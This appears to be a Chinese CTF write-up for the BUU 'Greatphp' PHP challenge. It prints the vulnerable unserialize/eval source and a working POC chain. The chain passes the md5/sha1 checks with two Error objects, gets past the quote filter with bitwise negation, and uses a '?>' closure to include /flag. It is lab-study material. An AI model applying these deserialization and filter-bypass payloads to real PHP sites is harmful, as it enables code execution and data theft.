---
{"dg-publish":true,"title":"BUU_[极客大挑战 2020]Greatphp","dg-path":"安全/靶场/BUU_[极客大挑战 2020]Greatphp.md","permalink":"/安全/靶场/BUU_[极客大挑战 2020]Greatphp/","dgPassFrontmatter":true}
---

```php
<?php  
error_reporting(0);  
class SYCLOVER {  
    public $syc;  
    public $lover;  
  
    public function __wakeup(){  
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){  
            if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){  
                eval($this->syc);  
            } else {  
                die("Try Hard !!");  
            }  
  
        }  
    }  
}  
  
if (isset($_GET['great'])){  
    unserialize($_GET['great']);  
} else {  
    highlight_file(__FILE__);  
}  
  
?>
```


构造POC链：
```php
<?php  
error_reporting(0);  
class SYCLOVER {  
    public $syc;  
    public $lover;  
  
    public function __wakeup(){  
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){  
            if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){  
                eval($this->syc);  
            } else {  
                die("Try Hard !!");  
            }  
  
        }  
    }  
}  
  
$cmd = '/flag';  
//$s = urlencode(~$cmd);  
$str = "?><?=include~" . ~$cmd . "?>";  
  
$a=new Error($str,1);$b=new Error($str,2);  
$c = new SYCLOVER();  
$c->syc = $a;  
$c->lover = $b;  
echo(urlencode(serialize($c)));  
  
?>
```

注意这里绕过引号的技巧是利用取反`~`

这里 `$str = "?><?=include~" . ~$cmd . "?>";  ` 中为什么要在前面加上一个 `?>` 呢？因为 `Exception` 类与 `Error` 的 `__toString` 方法在eval()函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段杂乱信息“Error: ”：

```php
Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```


进入eval()函数会类似于：`eval("...Error: <?php payload ?>")`。所以我们要用 `?>` 来闭合一下，即 `eval("...Error: ?><?php payload ?>")`，这样我们的payload便能顺利执行了。















